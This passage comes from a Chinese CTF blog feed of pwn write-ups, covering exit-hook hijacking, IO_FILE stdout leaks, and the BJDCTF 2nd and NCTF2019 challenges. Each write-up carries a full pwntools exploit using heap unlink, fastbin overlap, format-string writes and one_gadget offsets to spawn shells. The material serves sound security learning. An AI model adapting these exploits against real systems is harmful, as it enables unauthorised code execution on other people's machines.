href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>通过修改<code>_rtld_global</code>结构体中的<code>_dl_rtld_lock_recursive</code>指针的值为<code>one_gadget</code>来获取shell.<br>漏洞的原理是在调用<code>exit()</code>函数时有<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code>这样一条调用链，且<code>__rtld_lock_unlock_recursive</code>指针可读写，因此可以利用。<br>可以通过在gdb中<code>p &amp;_rtld_global._dl_rtld_lock_recursive</code>来获取偏移。</p><pre><code class="c">pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive$2 = (void (**)(void *)) 0x7ffff7ffdf60 &lt;_rtld_global+3840&gt;</code></pre><p>在这题中,因为过滤掉了三个<code>one_gadget</code>,因此选择将<code>one_gadget</code>前移一条指令,即改为<code>0x10a387</code>,就可以成功get shell了。</p><pre><code class="bash">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]#sh = process(&quot;./chall&quot;, env = {&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;})#  sh = process(&#39;./chall&#39;)sh = remote(&#39;39.97.210.182&#39;, 10055)sh.recvuntil(&#39;near: &#39;)libc_base = int(sh.recvuntil(&#39;\n&#39;)[:-1],16) - 0x809c0log.info(&quot;libc_base = &quot;+hex(libc_base))one_gadget = libc_base + 0x10a387dl_rtld_lock_recursive = libc_base + 0x81DF60log.info(&quot;target = &quot; + hex(dl_rtld_lock_recursive))log.info(&#39;one_gadget = &#39;+hex(one_gadget))#gdb.attach(sh)sh.recvuntil(&#39;shoot!shoot!\n&#39;)sh.sendline(str(dl_rtld_lock_recursive))sh.recvuntil(&#39;biang!\n&#39;)sleep(0.1)sh.sendline(p8(one_gadget &amp; 0xFF))sh.recvuntil(&#39;biang!\n&#39;)sleep(0.1)sh.sendline(p8((one_gadget &gt;&gt; 8) &amp; 0xFF))sh.recvuntil(&#39;biang!\n&#39;)sleep(0.1)sh.sendline(p8((one_gadget &gt;&gt; 16) &amp; 0xFF))sh.interactive()</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p><a href="http://www.starssgo.top/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">http://www.starssgo.top/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE Related</title>
      <link href="/2020/04/07/io_file_Related/"/>
      <url>/2020/04/07/io_file_Related/</url>
      
        <content type="html"><![CDATA[<p>上个月打比赛时见到的<code>IO_FILE</code>相关的利用技巧，摸了好久，现在记录一下。</p><a id="more"></a><h1 id="IO-FILE-相关定义"><a href="#IO-FILE-相关定义" class="headerlink" title="IO_FILE 相关定义"></a>IO_FILE 相关定义</h1><p>首先是<code>IO_FILE</code>的结构体定义:</p><pre><code class="c">struct _IO_FILE {  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags // _flags很关键，是利用的核心。  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;    /* Current read pointer */  char* _IO_read_end;    /* End of get area. */  char* _IO_read_base;    /* Start of putback+get area. */  char* _IO_write_base;    /* Start of put area. */  char* _IO_write_ptr;    /* Current put pointer. */  char* _IO_write_end;    /* End of put area. */  char* _IO_buf_base;    /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};</code></pre><p>结构体中大部分是一些函数指针，对于利用来说，重要的内容是<code>_flags</code>以及<code>_fileno</code>。<br><code>_fileno</code>的话，stdin,stdout,stderr分别对应就是1,2,3。</p><blockquote><p>对于一个FILE结构体来说，最重要的元素就是_flags和_fileno，_fileno存储的是我们的文件描述符，对于某些情况或许我们要劫持_fileno才能达到我们的目的，而_flags则标志了该FILE的一些行为，这对于我们的泄露至关重要。</p></blockquote><p>flags中的定义如下，<code>0xFBAD0000</code>是魔数，没什么特别的含义，都是以这个作为高二字节的内容。</p><pre><code class="c">/* Magic numbers and bits for the _flags field.   The magic numbers use the high-order bits of _flags;   the remaining bits are available for variable flags.   Note: The magic numbers must all be negative if stdio   emulation is desired. */#define _IO_MAGIC 0xFBAD0000 /* Magic number */#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */#define _IO_MAGIC_MASK 0xFFFF0000#define _IO_USER_BUF 1 /* User owns buffer; don&#39;t delete it on close. */#define _IO_UNBUFFERED 2#define _IO_NO_READS 4 /* Reading not allowed */#define _IO_NO_WRITES 8 /* Writing not allowd */#define _IO_EOF_SEEN 0x10#define _IO_ERR_SEEN 0x20#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&#39;t call close(_fileno) on cleanup. */#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/#define _IO_IN_BACKUP 0x100#define _IO_LINE_BUF 0x200#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */#define _IO_CURRENTLY_PUTTING 0x800#define _IO_IS_APPENDING 0x1000#define _IO_IS_FILEBUF 0x2000#define _IO_BAD_SEEN 0x4000#define _IO_USER_LOCK 0x8000#define _IO_FLAGS2_MMAP 1#define _IO_FLAGS2_NOTCANCEL 2#ifdef _LIBC# define _IO_FLAGS2_FORTIFY 4#endif#define _IO_FLAGS2_USER_WBUF 8#ifdef _LIBC# define _IO_FLAGS2_SCANF_STD 16# define _IO_FLAGS2_NOCLOSE 32# define _IO_FLAGS2_CLOEXEC 64#endif</code></pre><p>一般如果是没有<code>show()</code>函数，要利用<code>IO_FILE</code>进行libc泄露的话，一般是要把<code>flags</code>设置成<code>0xFBAD1800</code>,即设置<code>_IO_IS_APPENDING</code>和<code>_IO_CURRENTLY_PUTTING</code>.原因是为了绕过各种检测，满足输出的条件。具体可见后面的参考阅读。</p><h1 id="对于close-1-这类无法输出的利用方式"><a href="#对于close-1-这类无法输出的利用方式" class="headerlink" title="对于close(1)这类无法输出的利用方式"></a>对于<code>close(1)</code>这类无法输出的利用方式</h1><p>可以通过直接修改<code>bss</code>段<code>_IO_2_1_stdout</code>的指针低二字节为<code>stderr</code>的地址，或者是修改stdout结构体内部的<code>_fileno == 2</code>来通过stderr输出。</p><h2 id="Hgame2020-week5-Annevi-Note2"><a href="#Hgame2020-week5-Annevi-Note2" class="headerlink" title="Hgame2020 week5 Annevi_Note2"></a>Hgame2020 week5 Annevi_Note2</h2><p>正常的记事本类型程序，由于在一开始执行了<code>close(1)</code>，因此无法调用<code>show()</code>函数。</p><pre><code class="c">int init(){  puts(&quot;Annevi!The eternal God!&quot;);  puts(&quot;Welcome to Annevi&#39;s note2&quot;);  return close(1);}</code></pre><p>漏洞点在于<code>edit()</code>函数中</p><pre><code class="c">__int64 add(){  signed int i; // [rsp+8h] [rbp-8h]  signed int v2; // [rsp+Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    if ( i &gt; 19 )    {      puts(&quot;full!&quot;);      return 0LL;    }    if ( !list[i] )      break;  }  puts(&quot;size?&quot;);  v2 = readi(&quot;size?&quot;);  if ( v2 &lt;= 0x8F || v2 &gt; 0x400 )  {    puts(&quot;Invalid size!&quot;);    exit(0);  }  list[i] = malloc(v2);  printf(&quot;content:&quot;);  read_n(list[i], (unsigned int)v2);  puts(&quot;done!&quot;);  return 0LL;}__int64 edit(){  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;index?&quot;);  v1 = readi(&quot;index?&quot;);  if ( list[v1] )  {    printf(&quot;content:&quot;);    read_n(list[v1], 256LL);    puts(&quot;done!&quot;);  }  else  {    puts(&quot;Invalid index!&quot;);  }  return 0LL;}</code></pre><p>很明显,可以利用<code>unlink</code>来任意地址写，于是选择修改<code>0x6020A0</code>处的stdout指针为stderr指针，需要爆破一位，概率1/16。之后能泄露，就非常简单了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;#sh = remote(&#39;47.103.214.163&#39;,20301)def add(size,content):    sh.sendline(&#39;1&#39;)#    sh.recvuntil(&#39;size?\n&#39;)    sh.sendline(str(size))#    sh.recvuntil(&#39;content:&#39;)    sh.sendline(content)#    sh.recvuntil(&#39;:&#39;)def delete(index):    sh.sendline(&#39;2&#39;)#    sh.recvuntil(&#39;index?\n&#39;)    sh.sendline(str(index))#    sh.recvuntil(&#39;:&#39;)def show(index):    sh.sendline(&#39;3&#39;)#    sh.recvuntil(&#39;index?\n&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;content:&#39;)    content = sh.recv(6)#    sh.recvuntil(&#39;:&#39;)    return contentdef edit(index,content):    sh.sendline(&#39;4&#39;)    sleep(0.2)#    sh.recvuntil(&#39;index?\n&#39;)    sh.sendline(str(index))    sleep(0.2)#    sh.recvuntil(&#39;content:&#39;)    sh.sendline(content)#    sh.recvuntil(&#39;:&#39;)buf_addr = 0x6020E0STDOUT = 0x6020A0while(1):    sh = process(&#39;./AN2&#39;)    sh.recvuntil(&#39;note2\n&#39;)    add(0x90,&#39;a&#39;) #0    add(0x90,&#39;a&#39;) #1    add(0x90,&#39;a&#39;) #2    add(0x90,&#39;a&#39;) #3    delete(2)    add(0x90,&#39;&#39;) #2    add(0x90,&#39;/bin/sh 1&gt;&amp;2&#39;) #4    payload = p64(0) + p64(0x90) + p64(buf_addr - 3 * 0x8) + p64(buf_addr - 2 * 0x8)    payload +=  &#39;a&#39; * 0x70 + p64(0x90) + p64(0xa0)    edit(0,payload)    delete(1)    edit(0,&#39;a&#39; *0x18 + p64(buf_addr - 0x18) + p64(0x6020A0))    payload = &#39;\x40\x25&#39;    edit(1,payload)    try:        sh.sendline(&#39;3&#39;)#        sh.recvuntil(&#39;index?\n&#39;)        sh.sendline(&#39;0&#39;)        content = sh.recv(timeout=1)        if &#39;content&#39; in content:            break        else:            raise Exception(content)    except Exception as e:        print str(e)        sh.close()        continuelibc_base = u64(show(2).ljust(8,&#39;\x00&#39;)) - 0x3C4b78log.success(&#39;libc_base = &#39; + hex(libc_base))#gdb.attach(sh)malloc_hook = libc_base + 0x3C4B10one_gadget = libc_base + 0xf1147payload = &#39;a&#39; * 0x18 +  p64(buf_addr - 0x18) + p64(malloc_hook)edit(0,payload)edit(1,p64(one_gadget))sh.sendline(&#39;1&#39;)sh.sendline(&#39;144&#39;)sh.sendline(&#39;exec 1&gt;&amp;2&#39;) # 因为close(1)所以将stdout重定向到stderrsh.interactive()</code></pre><h2 id="在没有泄露函数的情况下利用-IO-2-1-stdout-获取libc基地址"><a href="#在没有泄露函数的情况下利用-IO-2-1-stdout-获取libc基地址" class="headerlink" title="在没有泄露函数的情况下利用_IO_2_1_stdout_获取libc基地址"></a>在没有泄露函数的情况下利用_IO_2_1_stdout_获取libc基地址</h2><p>这是上文一开始所说的常见利用方式，主要就是要修改<code>flags</code>为<code>0xFBAD1800</code>这样在调用<code>printf</code>或是<code>puts</code>是会输出libc地址。</p><h3 id="高校战“疫”网络安全分享赛pwn-Woodenbox2"><a href="#高校战“疫”网络安全分享赛pwn-Woodenbox2" class="headerlink" title="高校战“疫”网络安全分享赛pwn Woodenbox2"></a>高校战“疫”网络安全分享赛pwn Woodenbox2</h3><p>理论上是一道<code>House of Roman</code>的题目，需要爆破很久，步骤很多，但是利用泄露可以做的很轻松。<br>漏洞点在于<code>edit</code>可以任意size修改，但是苦于没有<code>show</code>函数因此无法泄露libc地址。<br>于是选择利用_IO_2_1_stdout_获取libc基地址。</p><pre><code>pwndbg&gt; p &amp;_IO_2_1_stdout_$4 = (struct _IO_FILE_plus *) 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;pwndbg&gt; fake_fastbin_all 0x7ffff7dd2620FAKE CHUNKS0x20: 0x30: 0x40: 0x50: 0x60: 0x70: [+] 0x7ffff7dd25dd , padding len: 0x330x80: pwndbg&gt; </code></pre><p>因为有size = 0x70的chunk可以获取，所以思路很明显了,通过修改fastbin链来获取这个chunk(需爆破一位)，进而修改<code>flags = 0xFBAD1800</code>,这样可以获得libc地址，之后就直接改malloc_hook即可.</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#context.log_level = &#39;DEBUG&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Please enter the length of item name:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Please enter the name of item:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice:&#39;)def edit_full(index,size,content):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Please enter the index of item:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Please enter the length of item name:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Please enter the new name of the item:&#39;)    sh.send(content)    sh.recvuntil(&#39;Your choice:&#39;)def edit(index,size,content):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Please enter the index of item:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Please enter the length of item name:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Please enter the new name of the item:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice:&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Please enter the index of item:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice:&#39;)while(1):    sh = process(&#39;./woodenbox2&#39;)    sh.recvuntil(&#39;Your choice:&#39;)    add(0x20,&#39;a&#39;) #0    add(0x40,&#39;a&#39;) #1    add(0x60,&#39;a&#39;) #2    add(0xa0,&#39;a&#39;) #3    edit(0,0x40,&#39;a&#39; * 0x20 + p64(0) + p64(0xc1))    delete(1)    delete(1)    add(0x40,&#39;a&#39;)     payload = &#39;a&#39; * 0x40 + p64(0) + p64(0x71) + &#39;\xdd\x25&#39;    edit_full(0,len(payload),payload)    add(0x60,&#39;a&#39;)    try:        payload = &#39;a&#39; * 0x3 + p64(0) * 6 + p64(0xfbad1800) + p64(0)*3 + &#39;\x00&#39;        sh.sendline(&#39;1&#39;)        sh.recvuntil(&#39;Please enter the length of item name:&#39;)        sh.sendline(str(0x60))        sh.recvuntil(&#39;Please enter the name of item:&#39;)        sh.send(payload)        sh.recv(0x40)        content = u64(sh.recv(8))        sh.recvuntil(&#39;Your choice:&#39;)    except EOFError:        continue    else:        log.info(hex(content))        libc_base = content - 0x3C5600        log.success(&#39;libc_base = &#39; + hex(libc_base) )        malloc_hook = libc_base + 0x3c4b10        fake_fast = malloc_hook - 0x23        one_gadget = libc_base + 0xf02a4        add(0x60,&#39;a&#39;)        add(0x60,&#39;a&#39;)        add(0x60,&#39;a&#39;)        add(0x60,&#39;a&#39;)        #gdb.attach(sh)        delete(6)        edit(4,0x80,&#39;a&#39; * 0x60 + p64(0) + p64(0x71) + p64(fake_fast))        add(0x60,&#39;a&#39;)        add(0x60,&#39;a&#39; * 0x13 + p64(one_gadget))        sh.sendline(&#39;4&#39;)        sh.interactive()</code></pre><h4 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h4><blockquote><p><a href="http://www.secwk.com/2019/08/27/2732/" target="_blank" rel="noopener">http://www.secwk.com/2019/08/27/2732/</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2nd pwn writeup</title>
      <link href="/2020/03/22/buuctf-wp/"/>
      <url>/2020/03/22/buuctf-wp/</url>
      
        <content type="html"><![CDATA[<p>BJDCTF 2nd pwn题的wp</p><a id="more"></a><h1 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h1><p>basic rop,<code>ret2text</code>,没什么好说的,漏洞点在<code>name_check</code>函数里面</p><pre><code class="c">char *__cdecl name_check(char *s){  char dest; // [esp+7h] [ebp-11h]  unsigned __int8 v3; // [esp+Fh] [ebp-9h]  v3 = strlen(s);  if ( v3 &lt;= 3u || v3 &gt; 8u )  {    puts(&quot;Oops,u name is too long!&quot;);    exit(-1);  }  printf(&quot;Hello,My dear %s&quot;, s);  return strcpy(&amp;dest, s);}</code></pre><p><code>v3</code>是<code>int8</code>直接构造整数溢出即可，这年头直接给后门函数的rop题不多了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#sh = process(&#39;./r2t3&#39;)sh = remote(&#39;node3.buuoj.cn&#39;,28755)system = 0x0804858b#gdb.attach(sh)#context.log_level = &#39;DEBUG&#39;payload = &#39;a&#39; * 0x15 +p32(system)payload += &#39;a&#39; * (0x106 - len(payload))sh.recvuntil(&quot;[+]Please input your name:\n&quot;)sh.sendline(payload)sh.interactive()</code></pre><h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><p><code>libc_2.29</code>的one_gedget题，基本白给。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *from LibcSearcher import LibcSearchersh = remote(&#39;node3.buuoj.cn&#39;,26087)#sh = process(&#39;./one_gadget&#39;)sh.recvuntil(&#39;:&#39;)printf_addr = int(sh.recvuntil(&#39;\n&#39;)[:-1],16)#libc = LibcSearcher(&quot;printf&quot;,printf_addr)libc_base = printf_addr - 0x62830one_gadget = libc_base + 0x106ef8sh.recvuntil(&#39;Give me your one gadget:&#39;)sh.sendline(str(one_gadget))sh.interactive()</code></pre><h1 id="ydsneedgirlfriend2"><a href="#ydsneedgirlfriend2" class="headerlink" title="ydsneedgirlfriend2"></a>ydsneedgirlfriend2</h1><p>因为<code>delele</code>之后指针未置0，所以再次<code>add</code>的时候会跳过第一个malloc(0x10)，所以在<code>delete</code>之后令name_size = 0x10,malloc(0x10)获取<code>girlfriend[0]</code>，修改fd指针,<code>show</code>即可getshell.</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;backdoor = 0x400d86#sh = process(&#39;./ydsneedgirlfriend2&#39;)sh = remote(&#39;node3.buuoj.cn&#39;,29361)def add(size,name):    sh.sendline(&quot;1&quot;)    sh.recvuntil(&#39;Please input the length of her name:\n&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Please tell me her name:\n&#39;)    sh.sendline(name)    sh.recvuntil(&quot;u choice :\n&quot;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Index :&#39;)    sh.sendline(str(index))    sh.recvuntil(&quot;u choice :\n&quot;)sh.recvuntil(&quot;u choice :\n&quot;)add(0x60,&#39;aa&#39;)#gdb.attach(sh)delete(0)payload = p64(0) + p64(backdoor)add(0x10,payload)sh.sendline(&#39;3&#39;)sleep(0.2)sh.sendline(&#39;0&#39;)sh.interactive()</code></pre><h1 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h1><p>格式化字符串漏洞，坑点在<code>fini_array</code>不可写，于是写<code>stack_chk_fail</code>的got表为<code>backdoor</code>来getshell.</p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *#sh = process(&#39;./r2t4&#39;)sh = remote(&#39;node3.buuoj.cn&#39;,26709)backdoor = 0x400626fini_array = 0x600E18bss_addr = 0x601050got_chk_fail = 0x601018context.log_level = &#39;DEBUG&#39;string =  &#39;aaaaa%1569c%8$hn&#39;#string = &#39;aaaaaaaaaaaa%8$p&#39;string += p64(got_chk_fail)string += &#39;a&#39; * 0x20#gdb.attach(sh)sh.sendline(string)#log.info(sh.recv())sh.interactive()</code></pre><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>有毒的指令过滤绕过，我是真的不会这种题目<em>(:з」∠)</em><br>由wood师傅提出的<code>od ????</code>利用通配符和<code>od</code>指令输出，但是这样获取的是一堆颠倒的八进制数据(小端序)，写一个python脚本转换成flag.</p><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">import binasciifrom pwn import *asc =&#39;&#39;&#39;066146 063541 033573 030062 061545 061545 026543 034461032543 032055 062464 026463 031142 061146 061455 034541061143 034063 060471 060546 076461 &#39;&#39;&#39;flag = &#39;&#39;for i in range(1,len(asc),7):    a = asc[i:i+6]    log.info(&#39;a = &#39; + a)    num = int(a,8)    h = hex(num)[2:]    s = binascii.a2b_hex(h)    s = s[::-1]    log.info(s)    flag += s    log.success(flag)</code></pre><h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>漏洞点在<code>welcome</code>函数的<br><code>buf[(signed int)((unsigned __int64)read(0, buf, 0x16uLL) - 1)] = 0;</code><br>读入0x16字节,能覆盖到后面的<code>times_ptr</code>，而每过一关<code>*(ptr)</code>的值都会-1，使用gdb调试时发现<code>printf</code>和<code>system</code>的got表中内容只相差0x10，因此修改<code>ptr</code>指针为<code>got_printf</code>,手动过16次，再故意输错触发<code>gameover</code>中的<code>printf(buf)</code>(此时got表已经为system的值)来getshell。</p><pre><code class="c">unsigned __int64 welcome(){  unsigned int i; // [rsp+Ch] [rbp-54h]  char s; // [rsp+10h] [rbp-50h]  unsigned __int64 v3; // [rsp+58h] [rbp-8h]  v3 = __readfsqword(0x28u);  *(_DWORD *)times_ptr = 10000;  for ( i = 0; i &lt;= 9; ++i )    buf[i] = 0;  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  puts(&quot;@====================================@&quot;);  print_str(&quot;# What&#39;s your name? ________________ #&quot;, 20);  buf[(signed int)((unsigned __int64)read(0, buf, 0x16uLL) - 1)] = 0;  sprintf(&amp;s, &quot;#      Welcome %-16s      #&quot;, buf);  puts(&amp;s);  puts(&quot;#====================================#&quot;);  puts(&quot;#    I have toooooo many secrets &gt;   #&quot;);  puts(&quot;#        Can u find them _&lt;          #&quot;);  puts(&quot;#====================================#&quot;);  return __readfsqword(0x28u) ^ v3;}unsigned __int64 get_secret(){  char buf; // [rsp+0h] [rbp-20h]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  print_str(&quot;#           Secret: _____            #&quot;, 20);  read(0, &amp;buf, 0xAuLL);  secret = atoi(&amp;buf);  --*(_DWORD *)times_ptr;  return __readfsqword(0x28u) ^ v2;}void __noreturn gameover(){  puts(&quot;#====================================#&quot;);  puts(&quot;#             GAME OVER              #&quot;);  puts(&quot;#====================================#&quot;);  print_str(&quot;#        BYE BYE~                    #&quot;, 18);  printf(buf, 18LL);  puts(&amp;zer0);  puts(&quot;@====================================@&quot;);  exit(0);}</code></pre><h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *import oscontext.log_level = &quot;DEBUG&quot;l = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]payload = &#39;/bin/sh\x00aaaaaaaa\x40\xd0\x46\x00\x00&#39;#sh = process(&#39;./secret&#39;)sh =remote(&#39;node3.buuoj.cn&#39;,28520)sh.recvuntil(&#39;What\&#39;s your name?&#39;)sh.sendline(payload)sh.recvuntil(&#39;Secret:&#39;)#gdb.attach(sh)for i in range(len(l)):    sh.sendline(str(l[i]))    sh.recvuntil(&#39;Secret:&#39;)#gdb.attach(sh)sh.sendline(&#39;1&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019-pwn-writeup</title>
      <link href="/2019/12/05/NCTF2019-pwn-writeup/"/>
      <url>/2019/12/05/NCTF2019-pwn-writeup/</url>
      
        <content type="html"><![CDATA[<p>NCTF2019pwn题的wp</p><a id="more"></a><h1 id="pwn-me-100-years-Ⅱ"><a href="#pwn-me-100-years-Ⅱ" class="headerlink" title="pwn me 100 years! (Ⅱ)"></a>pwn me 100 years! (Ⅱ)</h1><p>64位格式化字符串题,修改<code>base + 0x2020e0</code>地址处的值为0x66666666获取shell</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *#sh = process(&#39;./pwn_me_2&#39;)sh = remote(&#39;139.129.76.65&#39; ,50005)#context.log_level = &#39;DEBUG&#39;target_num = 0x6666 # 26214 len = 5#gdb.attach(sh)sh.recvuntil(&#39;but your name:&#39;)payload = &#39;a&#39; * 0x10 + &#39;%p,&#39;sh.sendline(payload)sh.recvuntil(&#39;preparing......&#39;)base_addr = int(sh.recvuntil(&#39;,&#39;)[:-1],16) - 0x202080log.info(&#39;base_addr = &#39; + hex(base_addr))target_addr = base_addr + 0x2020e0log.success(&#39;target_addr = &#39;+ hex(target_addr))sh.recvuntil(&#39;what do you want?&#39;)payload = &#39;%&#39; + str(target_num) + &#39;c&#39; + &#39;%10$hn&#39;  + &#39;%&#39; + str(0x16666 - target_num) + &#39;c&#39; + &#39;%11$hn&#39; + &#39;A&#39; * 6 + p64(target_addr) + p64(target_addr + 0x2)#payload = &#39;A&#39;*7 + &#39;%9$p,%10$p,%11$p,&#39; + &#39;A&#39;*8 +  p64(target_addr) + p64(target_addr + 0x4)sh.sendline(payload)sh.interactive()</code></pre><h1 id="pwn-me-100-years-Ⅲ"><a href="#pwn-me-100-years-Ⅲ" class="headerlink" title="pwn me 100 years! (Ⅲ)"></a>pwn me 100 years! (Ⅲ)</h1><p>堆题,漏洞点在于<code>off_by_one</code>修改chunk_size使得堆重叠来获得<code>libc_base</code>,之后的流程就很固定了,直接<code>malloc</code>size = 0x70的fake_chunk即可</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *#sh = process(&#39;./pwn_me_3&#39;)sh = remote(&#39;139.129.76.65&#39; ,50006)main_arena_88_offset = 0x3C4B78main_arena_offset = main_arena_88_offset - 88find_fake_fast = 0x3C4AEDone_gadget = 0xf1147malloc_hook = 0x3c4b10context.log_level = &#39;DEBUG&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;content:&#39;)    sh.send(content)    sh.recvuntil(&#39;5,exit&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;idx:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;5,exit&#39;)def show(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;idx&#39;)    sh.sendline(str(index))    content = sh.recvuntil(&#39;1&#39;)[1:-2]#    log.info(content)    sh.recvuntil(&#39;5,exit&#39;)    return contentdef edit(index,content):    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;idx:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;content:&#39;)    sh.send(content)    sh.recvuntil(&#39;5,exit&#39;)#gdb.attach(sh)sh.recvuntil(&#39;5,exit&#39;)add(8,&#39;aaaa&#39;) #0add(0x20,&#39;bbbb&#39;) #1add(0x40,&#39;c&#39;) #2add(0x60,&#39;d&#39;) #3 add(0x60,&#39;ee&#39;) #4add(0x60,&#39;ff&#39;) #5 edit(0,&#39;a&#39; * 16 + &#39;\x00&#39; * 8 + &#39;\xf1&#39;) #size 0xf1 = [1] + [2] + [3]delete(1)add(0x20,&#39;\n&#39;) #1 #show(2)libc_base = u64(show(2).ljust(8,&#39;\x00&#39;)) - main_arena_88_offsetlog.info(&#39;libc_base = &#39; +hex(libc_base))add(0x40,&#39;\n&#39;) #6add(0x60,&#39;\n&#39;) #7 堆重叠delete(2)delete(3)add(0x40,&#39;b&#39;)edit(7, p64(libc_base + find_fake_fast))add(0x60,&#39;a&#39;)add(0x60,&#39;a&#39;*0x13 + p64(libc_base + one_gadget))sh.sendline(&#39;1&#39;)sh.sendline(str(8))sh.interactive()</code></pre><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>看似简单的ROP题,但是<code>seccomp()</code>函数禁用了绝大部分的系统调用,所以不能使用<code>system(&#39;/bin/sh&#39;)</code>,看了别人的wp才知道是使用<code>mprotect()</code>来修改bss段权限,然后用<code>shellcraft</code>直接读flag</p><pre><code class="python">from pwn import 